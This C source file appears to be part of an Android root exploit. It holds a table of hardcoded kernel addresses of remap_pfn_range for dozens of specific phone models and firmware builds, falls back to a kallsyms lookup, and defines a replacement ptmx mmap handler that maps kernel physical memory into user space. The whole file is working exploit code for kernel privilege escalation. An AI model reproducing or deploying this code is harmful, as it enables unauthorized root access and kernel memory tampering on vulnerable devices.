#include "kallsyms.h"
#include "mm.h"
#include "device_database/device_database.h"

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int remap_pfn_range_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_IS17SH_01_00_04,                 0xc0208a34 },
  { DEVICE_SC01E_LJ3,                       0xc0192124 },
  { DEVICE_SC04E_MDI,                       0xc011383c },
  { DEVICE_SC04E_MF1,                       0xc01138a4 },
  { DEVICE_SGP321_10_1_1_A_1_307, 			0xc0109be4 },
  { DEVICE_SGP312_10_1_C_0_370,             0xc01090fc },
  { DEVICE_SGP311_10_1_C_0_370,             0xc01090fc },
  { DEVICE_SH04E_01_00_02,                  0xc00e458c },
  { DEVICE_SH04E_01_00_03,                  0xc00e46bc },
  { DEVICE_SO01E_9_1_C_0_473,               0xc010e1f4 },
  { DEVICE_SO02E_10_1_D_0_343,              0xc01124f4 },
  { DEVICE_SO03E_10_1_E_0_265,              0xc0109360 },
  { DEVICE_SO03E_10_1_E_0_269,              0xc0109370 },
  { DEVICE_SO04E_10_1_1_D_0_179,            0xc0112fc0 },
  { DEVICE_SOL21_9_1_D_0_395,               0xc010e33c },
  { DEVICE_SOL22_10_2_F_3_43,               0xc0112230 },
  { DEVICE_HTL21_1_29_970_1,                0xc00ff32c },
  { DEVICE_HTL22_1_05_970_1,                0xc0128b10 },
  { DEVICE_HTL22_1_07_970_4,                0xc0128b28 },
  { DEVICE_HTX21_1_20_971_1,                0xc00fa8b0 },
  { DEVICE_LG_E975_V10e,                    0xc0116598 },
  { DEVICE_LT26W_6_2_B_0_200,     0xc0136294 },
  { DEVICE_LT26W_6_2_B_0_211, 0xc01362a4 },
  { DEVICE_LT26I_6_2_B_0_211,     0xc0135650 },
  { DEVICE_LT26II_6_2_B_0_211, 0xc0135650 },
  { DEVICE_LT22I_6_2_A_1_100, 0xc0136358 },
  { DEVICE_ST27I_6_2_A_1_100, 0xc01366ec},
  { DEVICE_ST27A_6_2_A_1_100, 0xc01366ec},
  { DEVICE_C6603_10_1_1_A_1_307,  0xc0109894 },
  { DEVICE_C6602_10_1_1_A_1_307, 0xc0109894 },
  { DEVICE_C6603_10_1_1_A_1_253,  0xc0109894 },
  { DEVICE_C6602_10_1_1_A_1_253, 0xc0109894 },
  { DEVICE_C5302_12_0_A_1_284,    0xc011445c },
  { DEVICE_C5303_12_0_A_1_284, 0xc011445c },
  { DEVICE_C5306_12_0_A_1_284, 0xc011445c },
  { DEVICE_C6503_10_3_A_0_423,	0xc0112668 },
  { DEVICE_C6502_10_3_A_0_423, 0xc0112668 },
  { DEVICE_C6506_10_3_A_0_423, 0xc0112668 },
  { DEVICE_LT30P_9_1_A_1_141, 0xc01096e4 },
  { DEVICE_LT30P_9_1_A_1_142, 0xc01096e4 },
  { DEVICE_LT29I_9_1_B_0_411,  0xc010ac30 },
  { DEVICE_LT29I_9_1_B_1_67, 0xc010aaec },
  { DEVICE_LT25I_9_1_A_1_140, 0xc010dcfc},
  { DEVICE_LT25I_9_1_A_1_142, 0xc010dbb4},
  { DEVICE_N05E_A1000311,                   0xc0105800 },
  { DEVICE_NEXUS4_JDQ39,          0xc00f8114 },
  { DEVICE_NEXUS_JOP40C,                 0xc01350b0 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

unsigned long int
_get_remap_pfn_range_address(void)
{
  int i;
  device_id_t device_id;

  device_id = detect_device();

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id){
      return supported_devices[i].remap_pfn_range_address;
    }
  }

  print_reason_device_not_supported();

  return 0;
}

void *
get_remap_pfn_range_address(void)
{
  if (kallsyms_exist()) {
    return kallsyms_get_symbol_address("remap_pfn_range");
  }
  return (void*)_get_remap_pfn_range_address();
}

static unsigned long int kernel_phys_offset = 0;

void
set_kernel_phys_offset(unsigned long int offset)
{
  kernel_phys_offset = offset;
}

#define PAGE_SHIFT  12

int
ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
{
  return remap_pfn_range(vma, vma->vm_start,
                         kernel_phys_offset >> PAGE_SHIFT,
                         vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

